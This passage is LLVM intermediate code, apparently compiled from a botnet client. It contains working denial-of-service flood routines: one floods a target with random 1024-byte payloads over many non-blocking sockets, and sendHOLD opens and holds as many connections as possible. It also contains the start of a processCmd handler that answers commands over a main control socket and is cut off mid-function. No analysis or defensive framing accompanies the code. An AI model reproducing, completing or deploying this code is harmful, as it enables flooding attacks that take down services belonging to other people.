  %39 = alloca %struct.state_t, i64 %37, align 16
  store i64 %37, i64* %11, align 8
  %40 = bitcast %struct.state_t* %39 to i8*
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = mul i64 %42, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %40, i8 0, i64 %43, i1 false)
  %44 = call noalias i8* @malloc(i64 noundef 1024) #12
  store i8* %44, i8** %17, align 8
  %45 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %45, i8 0, i64 1024, i1 false)
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %47 = load i32, i32* %6, align 4
  %48 = add nsw i32 %46, %47
  store i32 %48, i32* %18, align 4
  br label %49

49:                                               ; preds = %230, %33
  %50 = load i32, i32* %18, align 4
  %51 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %52 = icmp sgt i32 %50, %51
  br i1 %52, label %53, label %231

53:                                               ; preds = %49
  store i32 0, i32* %8, align 4
  br label %54

54:                                               ; preds = %227, %53
  %55 = load i32, i32* %8, align 4
  %56 = load i32, i32* %7, align 4
  %57 = icmp slt i32 %55, %56
  br i1 %57, label %58, label %230

58:                                               ; preds = %54
  %59 = load i32, i32* %8, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %60
  %62 = getelementptr inbounds %struct.state_t, %struct.state_t* %61, i32 0, i32 1
  %63 = load i8, i8* %62, align 4
  %64 = zext i8 %63 to i32
  switch i32 %64, label %226 [
    i32 0, label %65
    i32 1, label %109
    i32 2, label %200
  ]

65:                                               ; preds = %58
  %66 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  %67 = load i32, i32* %8, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %68
  %70 = getelementptr inbounds %struct.state_t, %struct.state_t* %69, i32 0, i32 0
  store i32 %66, i32* %70, align 8
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %72
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %73, i32 0, i32 0
  %75 = load i32, i32* %74, align 8
  %76 = load i32, i32* %8, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %77
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %78, i32 0, i32 0
  %80 = load i32, i32* %79, align 8
  %81 = call i32 (i32, i32, ...) @fcntl(i32 noundef %80, i32 noundef 3, i8* noundef null)
  %82 = or i32 %81, 2048
  %83 = call i32 (i32, i32, ...) @fcntl(i32 noundef %75, i32 noundef 4, i32 noundef %82)
  %84 = load i32, i32* %8, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %85
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 8
  %89 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %90 = call i32 @connect(i32 noundef %88, %struct.sockaddr* noundef %89, i32 noundef 16)
  %91 = icmp ne i32 %90, -1
  br i1 %91, label %96, label %92

92:                                               ; preds = %65
  %93 = call i32* @__errno_location() #15
  %94 = load i32, i32* %93, align 4
  %95 = icmp ne i32 %94, 115
  br i1 %95, label %96, label %103

96:                                               ; preds = %92, %65
  %97 = load i32, i32* %8, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %98
  %100 = getelementptr inbounds %struct.state_t, %struct.state_t* %99, i32 0, i32 0
  %101 = load i32, i32* %100, align 8
  %102 = call i32 @close(i32 noundef %101)
  br label %108

103:                                              ; preds = %92
  %104 = load i32, i32* %8, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %105
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %106, i32 0, i32 1
  store i8 1, i8* %107, align 4
  br label %108

108:                                              ; preds = %103, %96
  br label %226

109:                                              ; preds = %58
  br label %110

110:                                              ; preds = %109
  store %struct.__sigset_t* %12, %struct.__sigset_t** %20, align 8
  store i32 0, i32* %19, align 4
  br label %111

111:                                              ; preds = %121, %110
  %112 = load i32, i32* %19, align 4
  %113 = zext i32 %112 to i64
  %114 = icmp ult i64 %113, 16
  br i1 %114, label %115, label %124

115:                                              ; preds = %111
  %116 = load %struct.__sigset_t*, %struct.__sigset_t** %20, align 8
  %117 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %116, i32 0, i32 0
  %118 = load i32, i32* %19, align 4
  %119 = zext i32 %118 to i64
  %120 = getelementptr inbounds [16 x i64], [16 x i64]* %117, i64 0, i64 %119
  store i64 0, i64* %120, align 8
  br label %121

121:                                              ; preds = %115
  %122 = load i32, i32* %19, align 4
  %123 = add i32 %122, 1
  store i32 %123, i32* %19, align 4
  br label %111, !llvm.loop !48

124:                                              ; preds = %111
  br label %125

125:                                              ; preds = %124
  br label %126

126:                                              ; preds = %125
  %127 = load i32, i32* %8, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %128
  %130 = getelementptr inbounds %struct.state_t, %struct.state_t* %129, i32 0, i32 0
  %131 = load i32, i32* %130, align 8
  %132 = srem i32 %131, 64
  %133 = zext i32 %132 to i64
  %134 = shl i64 1, %133
  %135 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %136 = load i32, i32* %8, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %137
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %138, i32 0, i32 0
  %140 = load i32, i32* %139, align 8
  %141 = sdiv i32 %140, 64
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds [16 x i64], [16 x i64]* %135, i64 0, i64 %142
  %144 = load i64, i64* %143, align 8
  %145 = or i64 %144, %134
  store i64 %145, i64* %143, align 8
  %146 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %146, align 8
  %147 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %147, align 8
  %148 = load i32, i32* %8, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %149
  %151 = getelementptr inbounds %struct.state_t, %struct.state_t* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = add nsw i32 %152, 1
  %154 = call i32 @select(i32 noundef %153, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %12, %struct.__sigset_t* noundef null, %struct.timeval* noundef %13)
  store i32 %154, i32* %16, align 4
  %155 = load i32, i32* %16, align 4
  %156 = icmp eq i32 %155, 1
  br i1 %156, label %157, label %184

157:                                              ; preds = %126
  store i32 4, i32* %14, align 4
  %158 = load i32, i32* %8, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %159
  %161 = getelementptr inbounds %struct.state_t, %struct.state_t* %160, i32 0, i32 0
  %162 = load i32, i32* %161, align 8
  %163 = bitcast i32* %15 to i8*
  %164 = call i32 @getsockopt(i32 noundef %162, i32 noundef 1, i32 noundef 4, i8* noundef %163, i32* noundef %14) #12
  %165 = load i32, i32* %15, align 4
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %167, label %178

167:                                              ; preds = %157
  %168 = load i32, i32* %8, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %169
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %170, i32 0, i32 0
  %172 = load i32, i32* %171, align 8
  %173 = call i32 @close(i32 noundef %172)
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 1
  store i8 0, i8* %177, align 4
  br label %183

178:                                              ; preds = %157
  %179 = load i32, i32* %8, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %180
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %181, i32 0, i32 1
  store i8 2, i8* %182, align 4
  br label %183

183:                                              ; preds = %178, %167
  br label %199

184:                                              ; preds = %126
  %185 = load i32, i32* %16, align 4
  %186 = icmp eq i32 %185, -1
  br i1 %186, label %187, label %198

187:                                              ; preds = %184
  %188 = load i32, i32* %8, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %189
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %190, i32 0, i32 0
  %192 = load i32, i32* %191, align 8
  %193 = call i32 @close(i32 noundef %192)
  %194 = load i32, i32* %8, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %195
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %196, i32 0, i32 1
  store i8 0, i8* %197, align 4
  br label %198

198:                                              ; preds = %187, %184
  br label %199

199:                                              ; preds = %198, %183
  br label %226

200:                                              ; preds = %58
  %201 = load i8*, i8** %17, align 8
  call void @makeRandomStr(i8* noundef %201, i32 noundef 1024)
  %202 = load i32, i32* %8, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %203
  %205 = getelementptr inbounds %struct.state_t, %struct.state_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 8
  %207 = load i8*, i8** %17, align 8
  %208 = call i64 @send(i32 noundef %206, i8* noundef %207, i64 noundef 1024, i32 noundef 16384)
  %209 = icmp eq i64 %208, -1
  br i1 %209, label %210, label %225

210:                                              ; preds = %200
  %211 = call i32* @__errno_location() #15
  %212 = load i32, i32* %211, align 4
  %213 = icmp ne i32 %212, 11
  br i1 %213, label %214, label %225

214:                                              ; preds = %210
  %215 = load i32, i32* %8, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %216
  %218 = getelementptr inbounds %struct.state_t, %struct.state_t* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 8
  %220 = call i32 @close(i32 noundef %219)
  %221 = load i32, i32* %8, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.state_t, %struct.state_t* %39, i64 %222
  %224 = getelementptr inbounds %struct.state_t, %struct.state_t* %223, i32 0, i32 1
  store i8 0, i8* %224, align 4
  br label %225

225:                                              ; preds = %214, %210, %200
  br label %226

226:                                              ; preds = %225, %199, %108, %58
  br label %227

227:                                              ; preds = %226
  %228 = load i32, i32* %8, align 4
  %229 = add nsw i32 %228, 1
  store i32 %229, i32* %8, align 4
  br label %54, !llvm.loop !49

230:                                              ; preds = %54
  br label %49, !llvm.loop !50

231:                                              ; preds = %49
  %232 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %232)
  br label %233

233:                                              ; preds = %231, %32
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendHOLD(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.__sigset_t*, align 8
  %21 = alloca i32, align 4
  %22 = alloca %struct.__sigset_t*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %23 = call i32 @getdtablesize() #12
  %24 = sdiv i32 %23, 2
  store i32 %24, i32* %7, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %5, align 4
  %27 = trunc i32 %26 to i16
  %28 = call zeroext i16 @htons(i16 noundef zeroext %27) #15
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %32 = call i32 @getHost(i8* noundef %30, %struct.in_addr* noundef %31)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %3
  br label %269

35:                                               ; preds = %3
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %37, i8 0, i64 8, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t, i64 %39, align 16
  store i64 %39, i64* %11, align 8
  %42 = bitcast %struct.state_t* %41 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %42, i8 0, i64 %45, i1 false)
  %46 = call noalias i8* @malloc(i64 noundef 1024) #12
  store i8* %46, i8** %17, align 8
  %47 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* align 1 %47, i8 0, i64 1024, i1 false)
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %49 = load i32, i32* %6, align 4
  %50 = add nsw i32 %48, %49
  store i32 %50, i32* %18, align 4
  br label %51

51:                                               ; preds = %266, %35
  %52 = load i32, i32* %18, align 4
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* noundef null)
  %54 = icmp sgt i32 %52, %53
  br i1 %54, label %55, label %267

55:                                               ; preds = %51
  store i32 0, i32* %8, align 4
  br label %56

56:                                               ; preds = %263, %55
  %57 = load i32, i32* %8, align 4
  %58 = load i32, i32* %7, align 4
  %59 = icmp slt i32 %57, %58
  br i1 %59, label %60, label %266

60:                                               ; preds = %56
  %61 = load i32, i32* %8, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %62
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %63, i32 0, i32 1
  %65 = load i8, i8* %64, align 4
  %66 = zext i8 %65 to i32
  switch i32 %66, label %262 [
    i32 0, label %67
    i32 1, label %111
    i32 2, label %202
  ]

67:                                               ; preds = %60
  %68 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  %69 = load i32, i32* %8, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %70
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %71, i32 0, i32 0
  store i32 %68, i32* %72, align 8
  %73 = load i32, i32* %8, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %74
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %75, i32 0, i32 0
  %77 = load i32, i32* %76, align 8
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %79
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %80, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  %83 = call i32 (i32, i32, ...) @fcntl(i32 noundef %82, i32 noundef 3, i8* noundef null)
  %84 = or i32 %83, 2048
  %85 = call i32 (i32, i32, ...) @fcntl(i32 noundef %77, i32 noundef 4, i32 noundef %84)
  %86 = load i32, i32* %8, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %87
  %89 = getelementptr inbounds %struct.state_t, %struct.state_t* %88, i32 0, i32 0
  %90 = load i32, i32* %89, align 8
  %91 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %92 = call i32 @connect(i32 noundef %90, %struct.sockaddr* noundef %91, i32 noundef 16)
  %93 = icmp ne i32 %92, -1
  br i1 %93, label %98, label %94

94:                                               ; preds = %67
  %95 = call i32* @__errno_location() #15
  %96 = load i32, i32* %95, align 4
  %97 = icmp ne i32 %96, 115
  br i1 %97, label %98, label %105

98:                                               ; preds = %94, %67
  %99 = load i32, i32* %8, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %100
  %102 = getelementptr inbounds %struct.state_t, %struct.state_t* %101, i32 0, i32 0
  %103 = load i32, i32* %102, align 8
  %104 = call i32 @close(i32 noundef %103)
  br label %110

105:                                              ; preds = %94
  %106 = load i32, i32* %8, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %107
  %109 = getelementptr inbounds %struct.state_t, %struct.state_t* %108, i32 0, i32 1
  store i8 1, i8* %109, align 4
  br label %110

110:                                              ; preds = %105, %98
  br label %262

111:                                              ; preds = %60
  br label %112

112:                                              ; preds = %111
  store %struct.__sigset_t* %12, %struct.__sigset_t** %20, align 8
  store i32 0, i32* %19, align 4
  br label %113

113:                                              ; preds = %123, %112
  %114 = load i32, i32* %19, align 4
  %115 = zext i32 %114 to i64
  %116 = icmp ult i64 %115, 16
  br i1 %116, label %117, label %126

117:                                              ; preds = %113
  %118 = load %struct.__sigset_t*, %struct.__sigset_t** %20, align 8
  %119 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %118, i32 0, i32 0
  %120 = load i32, i32* %19, align 4
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds [16 x i64], [16 x i64]* %119, i64 0, i64 %121
  store i64 0, i64* %122, align 8
  br label %123

123:                                              ; preds = %117
  %124 = load i32, i32* %19, align 4
  %125 = add i32 %124, 1
  store i32 %125, i32* %19, align 4
  br label %113, !llvm.loop !51

126:                                              ; preds = %113
  br label %127

127:                                              ; preds = %126
  br label %128

128:                                              ; preds = %127
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %130
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = srem i32 %133, 64
  %135 = zext i32 %134 to i64
  %136 = shl i64 1, %135
  %137 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %138 = load i32, i32* %8, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %139
  %141 = getelementptr inbounds %struct.state_t, %struct.state_t* %140, i32 0, i32 0
  %142 = load i32, i32* %141, align 8
  %143 = sdiv i32 %142, 64
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [16 x i64], [16 x i64]* %137, i64 0, i64 %144
  %146 = load i64, i64* %145, align 8
  %147 = or i64 %146, %136
  store i64 %147, i64* %145, align 8
  %148 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %148, align 8
  %149 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %149, align 8
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %151
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = add nsw i32 %154, 1
  %156 = call i32 @select(i32 noundef %155, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %12, %struct.__sigset_t* noundef null, %struct.timeval* noundef %13)
  store i32 %156, i32* %16, align 4
  %157 = load i32, i32* %16, align 4
  %158 = icmp eq i32 %157, 1
  br i1 %158, label %159, label %186

159:                                              ; preds = %128
  store i32 4, i32* %14, align 4
  %160 = load i32, i32* %8, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %161
  %163 = getelementptr inbounds %struct.state_t, %struct.state_t* %162, i32 0, i32 0
  %164 = load i32, i32* %163, align 8
  %165 = bitcast i32* %15 to i8*
  %166 = call i32 @getsockopt(i32 noundef %164, i32 noundef 1, i32 noundef 4, i8* noundef %165, i32* noundef %14) #12
  %167 = load i32, i32* %15, align 4
  %168 = icmp ne i32 %167, 0
  br i1 %168, label %169, label %180

169:                                              ; preds = %159
  %170 = load i32, i32* %8, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %171
  %173 = getelementptr inbounds %struct.state_t, %struct.state_t* %172, i32 0, i32 0
  %174 = load i32, i32* %173, align 8
  %175 = call i32 @close(i32 noundef %174)
  %176 = load i32, i32* %8, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %177
  %179 = getelementptr inbounds %struct.state_t, %struct.state_t* %178, i32 0, i32 1
  store i8 0, i8* %179, align 4
  br label %185

180:                                              ; preds = %159
  %181 = load i32, i32* %8, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %182
  %184 = getelementptr inbounds %struct.state_t, %struct.state_t* %183, i32 0, i32 1
  store i8 2, i8* %184, align 4
  br label %185

185:                                              ; preds = %180, %169
  br label %201

186:                                              ; preds = %128
  %187 = load i32, i32* %16, align 4
  %188 = icmp eq i32 %187, -1
  br i1 %188, label %189, label %200

189:                                              ; preds = %186
  %190 = load i32, i32* %8, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %191
  %193 = getelementptr inbounds %struct.state_t, %struct.state_t* %192, i32 0, i32 0
  %194 = load i32, i32* %193, align 8
  %195 = call i32 @close(i32 noundef %194)
  %196 = load i32, i32* %8, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %197
  %199 = getelementptr inbounds %struct.state_t, %struct.state_t* %198, i32 0, i32 1
  store i8 0, i8* %199, align 4
  br label %200

200:                                              ; preds = %189, %186
  br label %201

201:                                              ; preds = %200, %185
  br label %262

202:                                              ; preds = %60
  br label %203

203:                                              ; preds = %202
  store %struct.__sigset_t* %12, %struct.__sigset_t** %22, align 8
  store i32 0, i32* %21, align 4
  br label %204

204:                                              ; preds = %214, %203
  %205 = load i32, i32* %21, align 4
  %206 = zext i32 %205 to i64
  %207 = icmp ult i64 %206, 16
  br i1 %207, label %208, label %217

208:                                              ; preds = %204
  %209 = load %struct.__sigset_t*, %struct.__sigset_t** %22, align 8
  %210 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %209, i32 0, i32 0
  %211 = load i32, i32* %21, align 4
  %212 = zext i32 %211 to i64
  %213 = getelementptr inbounds [16 x i64], [16 x i64]* %210, i64 0, i64 %212
  store i64 0, i64* %213, align 8
  br label %214

214:                                              ; preds = %208
  %215 = load i32, i32* %21, align 4
  %216 = add i32 %215, 1
  store i32 %216, i32* %21, align 4
  br label %204, !llvm.loop !52

217:                                              ; preds = %204
  br label %218

218:                                              ; preds = %217
  br label %219

219:                                              ; preds = %218
  %220 = load i32, i32* %8, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %221
  %223 = getelementptr inbounds %struct.state_t, %struct.state_t* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 8
  %225 = srem i32 %224, 64
  %226 = zext i32 %225 to i64
  %227 = shl i64 1, %226
  %228 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %229 = load i32, i32* %8, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %230
  %232 = getelementptr inbounds %struct.state_t, %struct.state_t* %231, i32 0, i32 0
  %233 = load i32, i32* %232, align 8
  %234 = sdiv i32 %233, 64
  %235 = sext i32 %234 to i64
  %236 = getelementptr inbounds [16 x i64], [16 x i64]* %228, i64 0, i64 %235
  %237 = load i64, i64* %236, align 8
  %238 = or i64 %237, %227
  store i64 %238, i64* %236, align 8
  %239 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %239, align 8
  %240 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %240, align 8
  %241 = load i32, i32* %8, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %242
  %244 = getelementptr inbounds %struct.state_t, %struct.state_t* %243, i32 0, i32 0
  %245 = load i32, i32* %244, align 8
  %246 = add nsw i32 %245, 1
  %247 = call i32 @select(i32 noundef %246, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %12, %struct.timeval* noundef %13)
  store i32 %247, i32* %16, align 4
  %248 = load i32, i32* %16, align 4
  %249 = icmp ne i32 %248, 0
  br i1 %249, label %250, label %261

250:                                              ; preds = %219
  %251 = load i32, i32* %8, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %252
  %254 = getelementptr inbounds %struct.state_t, %struct.state_t* %253, i32 0, i32 0
  %255 = load i32, i32* %254, align 8
  %256 = call i32 @close(i32 noundef %255)
  %257 = load i32, i32* %8, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %258
  %260 = getelementptr inbounds %struct.state_t, %struct.state_t* %259, i32 0, i32 1
  store i8 0, i8* %260, align 4
  br label %261

261:                                              ; preds = %250, %219
  br label %262

262:                                              ; preds = %261, %201, %110, %60
  br label %263

263:                                              ; preds = %262
  %264 = load i32, i32* %8, align 4
  %265 = add nsw i32 %264, 1
  store i32 %265, i32* %8, align 4
  br label %56, !llvm.loop !53

266:                                              ; preds = %56
  br label %51, !llvm.loop !54

267:                                              ; preds = %51
  %268 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %268)
  br label %269

269:                                              ; preds = %267, %34
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @processCmd(i32 noundef %0, i8** noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %49 = load i8**, i8*** %4, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 0
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @strcmp(i8* noundef %51, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.45, i64 0, i64 0)) #11
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %57, label %54

54:                                               ; preds = %2
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %55, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0))
  br label %815

57:                                               ; preds = %2
  %58 = load i8**, i8*** %4, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @strcmp(i8* noundef %60, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.68, i64 0, i64 0)) #11
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %68, label %63

63:                                               ; preds = %57
